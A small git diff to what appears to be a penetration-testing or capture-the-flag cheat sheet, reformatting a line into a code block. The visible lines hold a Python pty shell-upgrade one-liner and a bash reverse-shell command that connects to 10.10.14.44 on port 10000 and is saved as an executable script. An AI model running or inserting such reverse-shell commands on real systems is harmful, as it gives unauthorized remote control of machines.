@@ -11,7 +11,7 @@ python -c 'import pty; pty.spawn("/bin/sh")'
 ```
 
 ### nice script for reverse
-echo 'bash -i >& /dev/tcp/10.10.14.44/10000 0>&1' > shell.sh ; chmod +x shell.sh
+```echo 'bash -i >& /dev/tcp/10.10.14.44/10000 0>&1' > shell.sh ; chmod +x shell.sh```
 
 ### spawn nicer shell 
 
